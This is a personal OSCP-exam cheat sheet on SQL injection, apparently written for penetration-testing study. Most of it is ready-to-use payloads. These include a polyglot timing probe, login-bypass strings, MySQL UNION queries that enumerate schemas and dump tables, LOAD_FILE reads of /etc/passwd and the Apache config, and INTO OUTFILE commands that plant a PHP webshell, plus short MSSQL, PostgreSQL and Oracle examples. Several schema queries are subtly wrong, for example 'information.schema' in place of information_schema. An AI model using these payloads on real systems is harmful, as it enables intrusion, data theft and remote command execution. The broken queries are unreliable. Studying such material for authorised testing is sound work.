# SQLI

#### Refs
https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/sql-injection/mysql-injection/README.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

#### Main
SQL Injection is a very common attack vector in the `OSCP` exam. You will most likely see atleast one box where it is the intended attack path. I would recommend to anyone that is unfamiliar with `SQL` to learn the language on a basic level first, and then understanding `SQLI` is way easier. With that being said the first thing you want to do is stuff the input fields with common `SQLI` cmds:

### Auth Bypass / SQLI Checker

#### God-Tier One-Liner

```txt
// Shoutout hacktricks and https://labs.detectify.com/ethical-hacking/ultimate-sql-injection-payload/ for this one.

SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```

#### List of CMDs you could try

```txt
';#---                   // List pulled from 0xsyr0's github.
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

### SQL Injection

After stuffing the input fields you should either obtain access to the system as admin or the first user in the database. If not, you might've received a success message or something like that telling you that the SQL server accepted your input. Before trying please remember that I am using `'` in this situation at the beginning of every `cmd` but this will change depending on which character worked for you in the previous steps. Lastly, it's important to recognize that each different type of `SQL` db will have its own injection techniques. Next, try these common injections:

#### MySQL

```txt
## Keep in mind, depending on if you are using Union Based Or Regular SQL Injection, you need to change the commands from UNION ALL SELECT 1,2,<CMD> to SELECT <CMD>

# Get number of columns
' ORDER BY 3--

# Fingerprinting
' UNION SELECT 1, VERSION(), 3--
' UNION SELECT 1,2, DATABASE()--
' UNION SELECT 1,2, USER()--

# Get all DBs on server
' UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata

# Get table name
' UNION ALL SELECT 1,2, GROUP_CONCAT(table_name) FROM information.schema.tables WHERE table.schema="<DATABASE>"--

# Get column name
' UNION ALL SELECT 1,2, GROUP_CONCAT(column_name) FROM information.schema.columns WHERE table.schema="<DATABASE>" AND table.name="<TABLE>"--

# Data dump
' UNION ALL SELECT 1,2,GROUP_CONCAT(CONCAT_WS(':', col1, col2, col3) SEPARATOR ' | ') FROM <TABLE>--

# File read
' SELECT LOAD_FILE('/etc/passwd')--

# Grab web config info
' SELECT LOAD_FILE('/etc/httpd/conf/httpd.conf')--

# AND

' SHOW VARIABLES LIKE 'secure_file_priv'--

# Create webshell
' SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--

# OR

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php"--
```
A couple extra things to keep in mind. `--` comments out the rest of the line. `0x7c` is just ASCII for a pipe. `+` is just url encoding for spaces.

### Other SQL Distros

Most of the SQLIs you will come across as a beginner will be MySQL. But, in some cases, it will be other distributions. For the most part, the syntax is the same depending on the distro. I won't go into every cmd on every distro as the general flow of the injection is extremely similar, enumerate DBs, Tables, Columns, and then Dump data, but I will just give an example to extrapolate from.


#### MSSQL

```txt
# Fingerprinting
' UNION ALL SELECT 1,@@VERSION,3--
' UNION ALL SELECT 1,SYSTEM_USER,3--
' UNION ALL SELECT 1,DB_NAME(),3--

# Get DBs
' SELECT name FROM master.sys.databases--

# Get tables
' SELECT name FROM <db>.sys.objects WHERE type = 'U'

# Get columns
' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '<table>') // THIS SYNTAX IS 20 YRS OLD BUT IS STILL COMPATIBLE, MIGHT BE DEPRECATED SOON.

# Dump data
' SELECT  <column1>, <column2> from <table>
```
The general syntax of `MSSQL` should make sense. But there are some weird things. `WHERE type = 'U'` just means user-defined table.
#### PostgreSQL

```txt
' UNION SELECT VERSION(), NULL-- 
```

#### Oracle SQL

```txt
' UNION ALL SELECT banner, NULL FROM v$version-- 
```
